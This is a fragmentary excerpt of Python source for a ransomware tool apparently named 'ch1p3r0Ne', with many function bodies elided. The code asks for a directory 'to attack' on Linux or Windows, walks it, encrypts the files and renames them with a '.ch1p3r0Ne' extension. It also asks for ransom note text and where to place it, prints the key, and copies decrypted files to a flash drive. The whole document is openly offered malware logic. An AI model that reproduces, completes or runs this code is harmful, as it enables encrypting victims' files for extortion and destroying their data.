        ...
        try:
            ...
            for fr in files:
                ...
                try:
                    ...
                    print(colored("[-]", 'red'),
                          f" ERROR COPYNG FILE TO FLASH DUE TO UNKNOWN AND CRITICAL ERROR: {pth} --> {flash}")
                    continue
        except PermissionError:
            print("Aaaa")
        except Exception as E:
...
def encrypt2(directory, fl):
    ...
    print(
        ...
        " THIS IS YOUR KEY FOR DECRYPT THE FILES: ",
        colored(str(key), 'yellow'),
    )
    display_encryption_status(" GETTING FILES FOR THE ATTACK.")
    time.sleep(0.4)
    directories = []
    ...
    display_encryption_status(" STARTING ENCRYPTING FILES.")
    for path in directories:
        ...
        try:
            ...
            os.rename(path, f"{path}.ch1p3r0Ne")
            time.sleep(0.4)
...
def display_encryption_status(arg0):
    time.sleep(0.4)
    print("=" * 100)
    print(colored("[+]", 'green'), arg0)
...
def linux2(op):
    ...
    if op == 1:
        ...
        handle_linux_attack_option()


def handle_linux_attack_option():
    linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
    repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
    ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
    decdir = input(colored("[*]",
                           'blue') + " put the directory/flash drive to write with decrypted files (probabily require the root access, a big flash drive like an external disk etc...): ")
...
def encrypt(directory, fl):
    ...
    show_encryption_progress(" GETTING FILES FOR THE ATTACK.")
    time.sleep(0.4)
    directories = []
    ...
    for root, dirs, files in os.walk(directory):
        try:
            ...
            continue
    print(colored("[+]", 'green'), " GETTING COMPLETED!")
    show_encryption_progress(" STARTING ENCRYPTING FILES.")
    for path in directories:
        if os.path.dirname(path).endswith(fl) or fl in os.path.dirname(path):
            continue
        if "chiperone_readme" in path:
...
def show_encryption_progress(arg0):
    time.sleep(0.4)
    print("=" * 100)
    print(colored("[+]", 'green'), arg0)
...
def linux(op):
    ...
    if op == 1:
        ...
        execute_linux_encryption_flow()


def execute_linux_encryption_flow():
    linuxdir = input(colored("[*]", 'blue') + " put the directory to attack (like /home etc...): ")
    repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
    ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
    decdir = input(colored("[*]",
...
def windows(op):
    ...
    if op == 1:
        ...
        process_windows_encryption_task()


def process_windows_encryption_task():
    windir = input(colored("[*]", 'blue') + " put the directory to attack (like C:/Users etc...): ")
    repdir = input(colored("[*]", 'blue') + " put the diretory to copy the ransomware text: ")
    ransomtext = input(colored("[*]", 'blue') + " put the ransomware text: ")
    decdir = input(colored("[*]",
                           'blue') + " put the directory/flash drive to write with decrypted files (probabily require the SYSTEM access, a big flash drive like an external disk etc...): ")
...
def print_available_options(arg0):
    systems_avaiables = arg0
